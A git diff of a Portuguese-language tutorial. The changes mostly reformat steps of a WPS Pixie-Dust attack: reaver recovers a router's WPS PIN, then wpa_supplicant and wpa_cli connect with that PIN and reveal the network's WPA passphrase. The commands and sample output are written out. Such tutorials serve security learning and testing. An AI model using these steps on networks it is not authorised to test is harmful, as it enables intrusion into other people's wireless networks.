@@ -46,9 +46,9 @@ sudo reaver -i <interface> -c <channel> -b <mac do ap> -K 1
 (pode ser adicionado a flag -vv)
 ```
 ##### O resultado pode variar um pouco porque depende muito do roteador que está sendo atacado. Essa falha é relativa ao firmware do roteador, não sendo todos os roteadores vulneráveis. Você pode ver alguns exemplos aqui -> https://forums.kali.org/showthread.php?25123-Reaver-modfication-for-Pixie-Dust-Attack ou pesquisar por conta própria e ver vários resultados diferentes que as pessoas conseguem por ai ...
-##### Dependendo do resultado do ataque o reaver consegue recuperar apenas o PIN do WPS. Nos meus teste foi esse resultado que consegui, então a idéia é essa, recuperar o PIN com o ataque offline pixie-dust e depois se conectar ao AP com o pin recuperado usando esse procedimento para então pegar o psk:
+##### Dependendo do resultado do ataque o reaver consegue recuperar apenas o PIN do WPS. Nos meus teste foi esse resultado que consegui, então a idéia é essa, recuperar o PIN com o ataque offline pixie-dust e depois se conectar ao AP com o pin recuperado usando o procedimento abaixo para então pegar o psk:
 
-1. Crie o arquivo wpa_supplicant.conf em /etc/ e nesse arquivo vai as seguintes linhas:
+1. ***Crie o arquivo wpa_supplicant.conf em /etc/ e nesse arquivo vai as seguintes linhas***:
 
 > ctrl_interface=/var/run/wpa_supplicant
 >  
@@ -57,21 +57,21 @@ sudo reaver -i <interface> -c <channel> -b <mac do ap> -K 1
 > update_config=1
   
 
-2. Inicie o wpa_supplicant, com o arquivo de configuração /etc/wpa_supplicant.conf:
+2. ***Inicie o wpa_supplicant, com o arquivo de configuração /etc/wpa_supplicant.conf***:
 ```  
 $ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
 ```
 
   
-3. Em outro terminal inicie o wpa_cli para realizar a conexão ao ponto de acesso por meio do número PIN:
+3. ***Em outro terminal inicie o wpa_cli para realizar a conexão ao ponto de acesso por meio do número PIN***:
 ```  
 $ wpa_cli wps_reg 74:EA:3A:E1:E8:66 02283470
                      <mac do ap>    <pin wps>
 ```
   
   
-4. o wpa_supplicant fará a conexão ao ponto de acesso. No terminal em que o wpa_supplicant foi iniciado
-é retornado uma mensagem de que a conexão foi bem-sucedida:
+4. ***O wpa_supplicant fará a conexão ao ponto de acesso. No terminal em que o wpa_supplicant foi iniciado
+é retornado uma mensagem de que a conexão foi bem-sucedida***:
 ```  
 $ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
 ioctl[SIOCSIWENCODEEXT]: Invalid argument
@@ -85,8 +85,8 @@ completed (auth) [id=1 id_str=]
 ```
   
   
-5 - Visualize o conteúdo do arquivo /etc/wpa_supplicant.conf com a senha
-wireless da rede:
+5. ***Visualize o conteúdo do arquivo /etc/wpa_supplicant.conf com a senha
+wireless da rede***:
 ```
 $ cat /etc/wpa_supplicant.conf
 network={
